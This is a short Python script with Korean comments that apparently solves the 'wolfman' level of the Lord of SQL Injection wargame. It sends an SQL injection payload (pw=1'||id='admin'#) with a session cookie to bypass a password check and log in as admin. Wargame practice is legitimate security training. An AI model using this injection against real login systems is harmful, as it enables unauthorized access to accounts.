# - *- coding : UTF-8 -*-
from requests import get

#URL을 설정합니다.
url = "http://los.eagle-jump.org/wolfman_f14e72f8d97e3cb7b8fe02bef1590757.php"
param = "?pw=1%27||id=%27admin%27%23"
new_url = url + param

#쿠키를 설정합니다. 쿠키는 반드시 자신의 것이어야합니다.
cookies = dict(PHPSESSID="5u71g5vp7547tv8ffl7osl0fl5")


#HTTP 요청을 보냅니다. 
r = get(new_url, cookies=cookies)

if r.text.find("<h2>WOLFMAN Clear!</h2>") > 0:
    print("축하합니다! Wolfman을 클리어했습니다!")
    
